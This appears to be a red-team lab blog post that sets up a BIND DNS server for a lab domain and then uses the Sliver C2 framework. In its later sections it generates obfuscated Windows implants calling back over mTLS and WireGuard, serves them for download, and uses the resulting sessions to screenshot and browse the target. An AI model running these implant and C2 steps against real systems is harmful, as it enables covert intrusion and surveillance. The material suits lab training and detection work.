---
title: 02-Sliver Protocols
draft: false
tags:
  - sliver
  - c2
  - redteam
  - mtls
  - wireguard
  - wireshark
  - dns-server
  - dns
  - bind
---
This post will be on using `mtls` and `wireguard` along with `beacon` and `session` on `Sliver`.

## Introduction

There are four main protocols that are used by `Sliver`:

- mTLS
- WireGuard
- HTTP
- DNS

`mTLS` and `WireGuard` works perfectly fine and we can expect good performance stable connection from them. However, when it comes to more well-secured networks, `mTLS` and `WireGuard` connection might be blocked. 

In such restricted environments, we can sue `HTTP` and `DNS`, we will further discuss later on.

## DNS Server

In this post, we will make use of `DNS Server`. 

This way, we can use DNS names instead of IP addresses for C2 endpoints. Now it doesn't mean a lot, but we are trying to make this lab environment as realistic as possible. 

On later posts, we will have lab set-up where target can only communicate to the C2 server through a 3rd server, not directly. We can learn more on using DNS server as this 3rd Server on later posts.

### Diagram

There are going to three VMs.

- DNS Server
- C2 Server
- Windows Target Machine

DNS Server will resolve `sliver.carabiner.local` to the C2 Server IP, `target.carabiner.local` to the target IP.

It will also forward other queries to the public DNS servers.

We are basically configuring the target VM to use this DNS service so that we will be able to specify `sliver.carabiner.local` as a C2 endpoint.

Not very realistic, but only for the Lab environment wise. 

In real world, we will actually be purchasing a domain so that we can use it as the DNS server. 

```
+-------------------+                              +-------------------+
|                   |                 Resolve DNS  |                   |
|   DNS Server VM   +--- UDP 53  <------------------+   Target VM      |
|     (Linux)       |                              |    (Windows)      |
|                   |                              |                   |
|  172.16.76.129    |                +-------------+ 172.16.76.132     |
|                   |                |             |                   |
+-------------------+                |             +----+---------+----+
                                     |                  |         |
         Download implant binary     |                  |         |
                 TCP 80             |                  |         |
              +---------------------+                  |         |
              |                                        |         |
              v                                        |         |
         +------------+                                |         |
         |            |   mTLS C2 Connection (TCP 8888)|         |
         |  C2 Server +<-------------------------------+         |
         |   (Linux)  |                                          |
         |            |   WireGuard C2 Connection (UDP 53) <-----+
         | 172.16.76.128                                         |
         +----------------+                                      |
                                                                 |
                                                                 v
```

### DNS Server Prep

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/02-vms.png)

There are many ways to set up a DNS server but here we will use the [named/BIND](https://en.wikipedia.org/wiki/BIND). 

> **BIND** ([/ˈbaɪnd/](https://en.wikipedia.org/wiki/Help:IPA/English "Help:IPA/English")) is a suite of software for interacting with the [Domain Name System](https://en.wikipedia.org/wiki/Domain_Name_System "Domain Name System") (DNS). Its most prominent component, **named** (pronounced _name-dee_: [/ˈneɪmdiː/](https://en.wikipedia.org/wiki/Help:IPA/English "Help:IPA/English"), short for _name [daemon](https://en.wikipedia.org/wiki/Daemon_\(computing\) "Daemon (computing)")_), performs both of the main DNS server roles, acting as an [authoritative name server](https://en.wikipedia.org/wiki/Authoritative_name_server "Authoritative name server") for [DNS zones](https://en.wikipedia.org/wiki/DNS_zone "DNS zone") and as a recursive [resolver](https://en.wikipedia.org/wiki/Resolver_\(DNS\) "Resolver (DNS)") in the network.

For the OS, we will use [Debian](https://www.debian.org/CD/http-ftp/#stable).

After installing Debian VM, run the following command to install all required software:

```
apt-get install bind9 bind9utils bind9-doc
```

We can find configuration files for the BIND in `/etc/bind`:

```
root@dns-server:/etc/bind# ls
bind.keys  db.255    named.conf		       named.conf.options
db.0	   db.empty  named.conf.default-zones  rndc.key
db.127	   db.local  named.conf.local	       zones.rfc1918
```

What we need to change is the content of `/etc/bind/named.conf.options`. This file controls how our DNS server behaves.

Content should look somewhat similar to below:

```text
acl "localnet" {
        172.16.76.0/24;
};


options {
        directory "/var/cache/bind";

        recursion yes;                     # resursive queries
        allow-recursion { localnet; };     # recursive queries

        listen-on { 172.16.76.129; };    # IP address of the DNS server
        allow-transfer { none; };          # disable zone transfers

        forwarders {
                8.8.8.8;
                8.8.4.4;
        };

        dnssec-validation auto;

        listen-on-v6 { any; };
};

logging {
        channel query {
            file "/var/log/bind/query" versions 5 size 10M;
            print-time yes;
            severity info;
        };

        category queries { query; };
};
```

Let's break down what we have. 

```
acl "localnet" {
        172.16.76.0/24;
};
```

- This defines a group called `"localnet"`.
    
- `172.16.76.0/24` refers to your local subnet (anything in `172.16.76.x`).
    
- You’ll use this to allow or restrict certain actions **only for local machines**.

```
options {
        directory "/var/cache/bind";
```

This is the main configuration block for the DNS server's behavior.
- This is where BIND stores cached DNS answers.

```
        recursion yes;
        allow-recursion { localnet; };
```

- `recursion yes`: allows the DNS server to perform recursive queries (i.e., if it doesn’t know the answer, it asks other DNS servers).
    
- `allow-recursion { localnet; };`: only allow recursive queries from machines on your local network (`172.16.76.0/24`).

```
        listen-on { 172.16.76.129; };
```

- This tells BIND to **only listen for DNS requests** on this specific IP (which is your DNS server's IP).

```
        allow-transfer { none; };
```

- Prevents **zone transfers**, which are used for DNS replication between servers. You don't want this unless you're running secondary DNS servers.

```
        forwarders {
                8.8.8.8;
                8.8.4.4;
        };
```

- If your DNS server doesn’t know the answer, it forwards the query to Google's public DNS servers.

```
        dnssec-validation auto;
```

- Enables DNSSEC (DNS Security Extensions), which helps ensure DNS responses haven’t been tampered with.

```
        listen-on-v6 { any; };
```

- This means the DNS server will listen on all available IPv6 interfaces.

```
logging {
        channel query {
            file "/var/log/bind/query" versions 5 size 10M;
            print-time yes;
            severity info;
        };

        category queries { query; };
};
```

This sets up **logging for DNS queries**:

- Logs go to `/var/log/bind/query`
    
- Keeps 5 rotated files, each up to 10MB
    
- Includes timestamps
    
- Only logs query-related events
    
This is **super helpful** for debugging and seeing if your DNS server is working.

Let's manually create a directory so that the log file can be created inside of it:

```
root@dns-server:/etc/bind# mkdir -p /var/log/bind
root@dns-server:/etc/bind# chown bind /var/log/bind
```

Now, whitelist the directory in `/etc/apparmor.d/usr.sbin.named` by adding the following two lines anywhere in the list:

```text
profile named /usr/sbin/named flags=(attach_disconnected) {
  ...
  /var/log/bind/** rw,
  /var/log/bind/ rw,
  ...
}
```

**Summary**

- Allows only the local subnet (`172.16.76.0/24`) to use DNS recursion

- Forwards unknown queries to Google DNS
    
- Listens on a specific IP only (your DNS server)
    
- Logs DNS queries
    
- Enhances security with DNSSEC and disables zone transfers

Now that we have `apparmor` set up, let's run the command `systemctl restart apparmor` so that the changes take effect. 

### Zone Directory Set-up

Let's create a directory to store zone files using the command `mkdir -p /etc/bind/zones`. After running the command, Specify the forward and reverse zones for the lab network in `/etc/bind/named.conf.local` like this:

```text
zone "carabiner.local" {
    type master;
    file "/etc/bind/zones/db.carabiner.local";   # zone file path
};

zone "76.16.172.in-addr.arpa" {
    type master;
    file "/etc/bind/zones/db.76.16.172";    # 172.16.76.0/24
};
```


 We are configuring `BIND`, the DNS server and to serve our custom lab domain `carabiner.local`, and handle reverse DNS lookups (i.e, IP -> Domain) for our internal network.

Let's break down `named.conf.local` file. We are adding two zone declarations:

```
zone "carabiner.local" {
    type master;
    file "/etc/bind/zones/db.carabiner.local";   # zone file path
};
```

- **Zone**: `carabiner.local`
    
    - This is your **internal lab domain** (like `sliver.carabiner.local`, `target.carabiner.local`).
        
- **Type**: `master`
    
    - This DNS server is the **authoritative source** for that domain.
        
- **File**: `/etc/bind/zones/db.carabiner.local`
    
    - This file will contain **A records** (like `target.carabiner.local` → `192.168.122.160`)

```
zone "76.16.172.in-addr.arpa" {
    type master;
    file "/etc/bind/zones/db.76.16.172";
};
```

- **Zone**: `172.16.76.in-addr.arpa`
    
    - This is the **reverse zone** for the IP range `172.16.76.0/24`
        
    - It handles **PTR records** (like `172.16.76.128` → `target.carabiner.local`)
        
- **File**: `/etc/bind/zones/db.76.16.172`
    
    - This is where you'll define the reverse mapping entries.

On to the forward zone specification, which goes into `/etc/bind/zones/db.carabiner.local`:

```text
$TTL    604800
@       IN      SOA     ns.carabiner.local. admin.carabiner.local. (
                              4         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL

; name servers - NS records
    IN      NS      ns.carabiner.local.

; name servers - A records
ns.carabiner.local.          IN      A       172.16.76.129

; 172.16.76.0/24 - A records
target.carabiner.local.        IN      A      172.16.76.132
sliver.carabiner.local.        IN      A      172.16.76.128
```

Just to have a really professional DNS setup, I also added support for reverse lookups. This is my content of `/etc/bind/zones/db.76.16.172` :

```
$TTL    604800
@       IN      SOA     ns.carabiner.local. admin.carabiner.local. (
                              4         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL

; name servers
        IN      NS      ns.carabiner.local.

; PTR Records
129     IN      PTR     ns.carabiner.local.        ; 172.16.76.129
128     IN      PTR     sliver.carabiner.local.    ; 172.16.76.128
132     IN      PTR     target.carabiner.local.    ; 172.16.76.132
```

Now check all config files for errors with the following commands:

- run `named-checkconf` to check the options: no output means no errors
- run `named-checkzone labnet.local /etc/bind/zones/db.carabiner.local` and look for `OK`
- run `named-checkzone 76.16.172.in-addr.arpa /etc/bind/zones/db.76.16.172` and look for OK

Results for the above commands should look something like this:

```
root@dns-server:/etc/bind/zones# named-checkconf
root@dns-server:/etc/bind/zones# named-checkzone carabiner.local /etc/bind/zones/db.carabiner.local
zone carabiner.local/IN: loaded serial 4
OK
root@dns-server:~# named-checkzone 76.16.172.in-addr.arpa /etc/bind/zones/db.76.16.172
zone 76.16.172.in-addr.arpa/IN: loaded serial 4
OK
```

If everything is working correctly, restart bind with the command `systemctl restart bind9`.

### Verification

Now let's verify that the DNS resolution is working correctly.

Go to our Sliver C2 Server and use the `dig` command to verify:

```
┌──(carabiner1㉿carabiner)-[~]
└─$ dig +short @172.16.76.129 target.carabiner.local
172.16.76.132
```

Below command will check whether reverse zone if working properly:

```
dig +short @172.16.76.129 -x 172.16.76.128
```

### DNS Configuration on Target

Now we have the new DNS server set up properly. Let's configure the target Windows machine to use the DNS server. 

Right-click the network tray icon in the lower right and change the adapter's settings so that it uses our new DNS server:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/02-windows-dns.png)

By going to `sliver.carabiner.local`, we can now see that this DNS server is working. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/02-dns-very.png)

## More on mTLS Transport

```
sliver > generate beacon --os windows --arch amd64 --format exe --seconds 5 --save /tmp/implant-domain-ip.exe --mtls sliver.carabiner.local,172.16.76.128

[*] Generating new windows/amd64 beacon implant binary (5s)
[*] Symbol obfuscation is enabled
[*] Build completed in 25s
[*] Implant saved to /tmp/implant-domain-ip.exe
```

```
sliver > jobs

[*] No active jobs

sliver > mtls

[*] Starting mTLS listener ...

[*] Successfully started job #2

sliver > jobs

 ID   Name   Protocol   Port   Stage Profile 
==== ====== ========== ====== ===============
 2    mtls   tcp        8888      
```

```
┌──(carabiner1㉿carabiner)-[/var/www/html]
└─$ ls -l *exe       
-rwx------ 1 www-data   www-data   15833088 May 25 20:51 COLD_INCIDENT.exe
-rwx------ 1 www-data   www-data   15847936 May 25 22:53 TRADITIONAL_GIFT.exe
-rwx------ 1 carabiner1 carabiner1 15813632 May 28 07:20 implant-domain-ip.exe
```

```
sudo chown www-data:www-data /var/www/html/implant-domain-ip.exe 
```

```
sliver > mtls

[*] Starting mTLS listener ...

[!] rpc error: code = Unknown desc = listen tcp :8888: bind: address already in use

[*] Beacon d5968297 SICK_CRECHE - 172.16.76.132:59583 (DESKTOP-R6MQCK6) - windows/amd64 - Wed, 28 May 2025 08:31:55 EDT
```

`udp.stream eq 60`


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/02-wireshark1.png)

`tls.handshake.extensions_server_name`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/02-wireshark2.png)

`tcp.port == 8888`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/02-wireshark3.png)

```
sliver > use

? Select a session or beacon: BEACON  d2736554  SICK_CRECHE       172.16.76.132:59647  DESKTOP-R6MQCK6  DESKTOP-R6MQCK6\win10  windows/amd64
[*] Active beacon SICK_CRECHE (d2736554-1c9b-42a8-8e0b-8cd1e441f2dc)

sliver (SICK_CRECHE) > screenshot

[*] Tasked beacon SICK_CRECHE (39aaa63e)

sliver (SICK_CRECHE) > tasks

 ID         State     Message Type   Created                         Sent   Completed 
========== ========= ============== =============================== ====== ===========
 39aaa63e   pending   Screenshot     Wed, 28 May 2025 08:50:54 EDT                    


sliver (SICK_CRECHE) > tasks

 ID         State     Message Type   Created                         Sent   Completed 
========== ========= ============== =============================== ====== ===========
 39aaa63e   pending   Screenshot     Wed, 28 May 2025 08:50:54 EDT                    


sliver (SICK_CRECHE) > tasks

 ID         State     Message Type   Created                         Sent   Completed 
========== ========= ============== =============================== ====== ===========
 39aaa63e   pending   Screenshot     Wed, 28 May 2025 08:50:54 EDT                    


[+] SICK_CRECHE completed task 39aaa63e

[*] Screenshot written to /tmp/screenshot_DESKTOP-R6MQCK6_20250528085105_266791135.png (110.7 KiB)
```

## WireGuard

```
sliver > generate --os windows --arch amd64 --format exe --save /tmp/implant-wireguard.exe --wg sliver.carabiner.local,172.16.76.128

[*] Generated unique ip for wg peer tun interface: 100.64.0.2
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 30s
[*] Implant saved to /tmp/implant-wireguard.exe
```

```
sliver > jobs

 ID   Name   Protocol   Port   Stage Profile 
==== ====== ========== ====== ===============
 3    mtls   tcp        8888                 

sliver > jobs --kill 3

[*] Killing job #3 ...
[*] Successfully killed job #3

[!] Job #3 stopped (tcp/mtls)

sliver > mtls

[*] Starting mTLS listener ...

[*] Successfully started job #4
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/02-wg-broken.png)

```
sliver > wg

[*] Starting Wireguard listener ...
[*] Successfully started job #5

[*] Session 317d6dda TRAGIC_BLOUSE - 100.64.0.3:31662 (DESKTOP-R6MQCK6) - windows/amd64 - Wed, 28 May 2025 09:19:52 EDT

sliver > use

? Select a session or beacon: SESSION  317d6dda  TRAGIC_BLOUSE     100.64.0.3:31662     DESKTOP-R6MQCK6  DESKTOP-R6MQCK6\win10  windows/amd64
[*] Active session TRAGIC_BLOUSE (317d6dda-fe3e-4135-b81e-be7066a8e6db)

sliver (TRAGIC_BLOUSE) > ls

C:\Users\win10\Downloads (6 items, 147.3 MiB)
=============================================
-rw-rw-rw-  COLD_INCIDENT.exe        15.1 MiB  Mon May 26 09:57:53 +0900 2025
-rw-rw-rw-  desktop.ini              282 B     Mon May 26 00:16:50 +0900 2025
-rw-rw-rw-  implant-domain-ip.exe    15.1 MiB  Wed May 28 21:31:48 +0900 2025
-rw-rw-rw-  implant-wireguard.exe    18.8 MiB  Wed May 28 22:13:25 +0900 2025
-rw-rw-rw-  TRADITIONAL_GIFT.exe     15.1 MiB  Mon May 26 11:55:42 +0900 2025
-rw-rw-rw-  Wireshark-4.4.6-x64.exe  83.3 MiB  Wed May 28 20:23:54 +0900 2025


sliver (TRAGIC_BLOUSE) > screenshot

[*] Screenshot written to /tmp/screenshot_DESKTOP-R6MQCK6_20250528092024_3007256778.png (107.9 KiB)

[*] Session 4271778f TRAGIC_BLOUSE - 100.64.0.5:58265 (DESKTOP-R6MQCK6) - windows/amd64 - Wed, 28 May 2025 09:20:38 EDT
```

## References
- https://dominicbreuker.com/post/learning_sliver_c2_03_transports_in_detail_mtls_and_wg/
